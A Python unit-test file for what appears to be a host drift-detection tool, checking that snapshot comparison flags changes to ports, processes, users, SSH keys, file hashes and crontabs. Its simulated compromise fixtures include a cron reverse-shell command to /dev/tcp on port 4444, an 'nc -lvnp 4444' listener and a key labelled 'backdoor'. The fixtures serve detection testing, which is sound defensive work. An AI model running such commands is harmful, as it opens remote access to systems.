import unittest
from pathlib import Path
from orin.core.database import OrinStorage
from orin.core.crypto import generate_signed_export
from orin.analysis.diff import load_snapshot_data, compare_snapshots

class TestDiff(unittest.TestCase):
    def setUp(self):
        self.db_path_1 = Path("test_diff_1.db")
        self.db_path_2 = Path("test_diff_2.db")
        self.export_path_1 = Path("test_diff_export_1.json")
        self.export_path_2 = Path("test_diff_export_2.json")
        
        for db_path in [self.db_path_1, self.db_path_2]:
            storage = OrinStorage(db_path)
            storage.initialize_db()

    def tearDown(self):
        for path in [self.db_path_1, self.db_path_2, self.export_path_1, self.export_path_2]:
            if path.exists():
                path.unlink()

    def test_load_snapshot_data_db(self):
        storage = OrinStorage(self.db_path_1)
        with storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'host1', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 80, 'TCP', 'nginx');")
            conn.execute("INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) VALUES (1, '/etc/crontab', 'root', '* * * * *', 'reboot');")
            conn.commit()
            
        data = load_snapshot_data(self.db_path_1)
        self.assertEqual(data["source"], "database")
        self.assertEqual(data["metadata"]["hostname"], "host1")
        self.assertEqual(len(data["ports"]), 1)
        self.assertEqual(data["ports"][0]["port"], 80)
        self.assertEqual(len(data["crontabs"]), 1)
        self.assertEqual(data["crontabs"][0]["command"], "reboot")

    def test_load_snapshot_data_export(self):
        storage = OrinStorage(self.db_path_1)
        with storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'host1', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 80, 'TCP', 'nginx');")
            conn.execute("INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) VALUES (1, '/etc/crontab', 'root', '* * * * *', 'reboot');")
            conn.commit()
            
        secret = "super_secure_passphrase"
        export_bundle = generate_signed_export(self.db_path_1, 1, secret)
        self.export_path_1.write_text(export_bundle)
        
        data = load_snapshot_data(self.export_path_1, secret)
        self.assertEqual(data["source"], "export")
        self.assertEqual(data["metadata"]["hostname"], "host1")
        self.assertEqual(len(data["ports"]), 1)
        self.assertEqual(data["ports"][0]["port"], 80)
        self.assertEqual(len(data["crontabs"]), 1)
        self.assertEqual(data["crontabs"][0]["command"], "reboot")

    def test_compare_snapshots_drift(self):
        # Base Snapshot
        base_data = {
            "metadata": {"hostname": "host1", "os_platform": "Linux", "timestamp": "2026-06-03T12:00:00Z"},
            "ports": [{"port": 22, "protocol": "TCP", "process_name": "sshd"}],
            "outbound": [],
            "processes": [{"pid": 100, "ppid": 1, "name": "sshd", "exe": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D"}],
            "kernel_modules": [{"module_name": "ext4", "memory_size": 50000, "instances_loaded": 1}],
            "users": [
                {"username": "root", "uid": 0, "gid": 0, "home_dir": "/root", "login_shell": "/bin/bash"},
                {"username": "musa", "uid": 1000, "gid": 1000, "home_dir": "/home/musa", "login_shell": "/bin/bash"}
            ],
            "ssh_keys": [],
            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash1"}],
            "crontabs": [
                {"source": "/etc/crontab", "user": "root", "schedule": "17 * * * *", "command": "run-parts /etc/cron.hourly"}
            ]
        }
        
        # Target Snapshot (Modified state)
        target_data = {
            "metadata": {"hostname": "host1", "os_platform": "Linux", "timestamp": "2026-06-03T13:00:00Z"},
            "ports": [
                {"port": 22, "protocol": "TCP", "process_name": "sshd"},
                {"port": 4444, "protocol": "TCP", "process_name": "nc"} # ADDED
            ],
            "outbound": [{"local_ip": "127.0.0.1", "local_port": 50000, "remote_ip": "8.8.8.8", "remote_port": 53, "state": "ESTABLISHED", "process_name": "dns"}], # ADDED
            "processes": [
                {"pid": 100, "ppid": 1, "name": "sshd", "exe": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D"},
                {"pid": 200, "ppid": 1, "name": "nc", "exe": "/usr/bin/nc", "cmdline": "nc -lvnp 4444"} # ADDED
            ],
            "kernel_modules": [], # REMOVED ext4
            "users": [
                {"username": "root", "uid": 0, "gid": 0, "home_dir": "/root", "login_shell": "/bin/bash"},
                {"username": "musa", "uid": 1000, "gid": 1000, "home_dir": "/home/musa", "login_shell": "/bin/sh"} # MODIFIED shell
            ],
            "ssh_keys": [{"user_account": "musa", "key_type": "ssh-ed25519", "fingerprint": "fp123", "raw_key_comment": "backdoor"}], # ADDED
            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash_changed"}], # MODIFIED hash
            "crontabs": [
                {"source": "/var/spool/cron/crontabs/alice", "user": "alice", "schedule": "* * * * *", "command": "/tmp/backup.sh"},
                {"source": "/etc/cron.d/shell", "user": "root", "schedule": "* * * * *", "command": "bash -i >& /dev/tcp/1.1.1.1/4444"}
            ]
        }
        
        diff = compare_snapshots(base_data, target_data)
        
        # Verify network ports drift
        self.assertEqual(len(diff["ports"]["added"]), 1)
        self.assertEqual(diff["ports"]["added"][0]["port"], 4444)
        self.assertEqual(len(diff["ports"]["removed"]), 0)
        
        # Verify outbound connection drift
        self.assertEqual(len(diff["outbound"]["added"]), 1)
        self.assertEqual(diff["outbound"]["added"][0]["remote_ip"], "8.8.8.8")
        
        # Verify processes drift
        self.assertEqual(len(diff["processes"]["added"]), 1)
        self.assertEqual(diff["processes"]["added"][0]["name"], "nc")
        
        # Verify kernel modules drift
        self.assertEqual(len(diff["kernel_modules"]["removed"]), 1)
        self.assertEqual(diff["kernel_modules"]["removed"][0]["module_name"], "ext4")
        
        # Verify user account modifications
        self.assertEqual(len(diff["users"]["modified"]), 1)
        self.assertEqual(diff["users"]["modified"][0]["username"], "musa")
        self.assertEqual(diff["users"]["modified"][0]["changes"]["login_shell"]["new"], "/bin/sh")
        
        # Verify SSH keys drift
        self.assertEqual(len(diff["ssh_keys"]["added"]), 1)
        self.assertEqual(diff["ssh_keys"]["added"][0]["raw_key_comment"], "backdoor")
        
        # Verify FIM file hash changes
        self.assertEqual(len(diff["file_hashes"]["modified"]), 1)
        self.assertEqual(diff["file_hashes"]["modified"][0]["file_path"], "/etc/passwd")
        self.assertEqual(diff["file_hashes"]["modified"][0]["new_hash"], "hash_changed")

        # Verify crontabs drift
        self.assertEqual(len(diff["crontabs"]["added"]), 2)
        added_commands = [c["command"] for c in diff["crontabs"]["added"]]
        self.assertIn("/tmp/backup.sh", added_commands)
        self.assertIn("bash -i >& /dev/tcp/1.1.1.1/4444", added_commands)

        self.assertEqual(len(diff["crontabs"]["removed"]), 1)
        self.assertEqual(diff["crontabs"]["removed"][0]["command"], "run-parts /etc/cron.hourly")
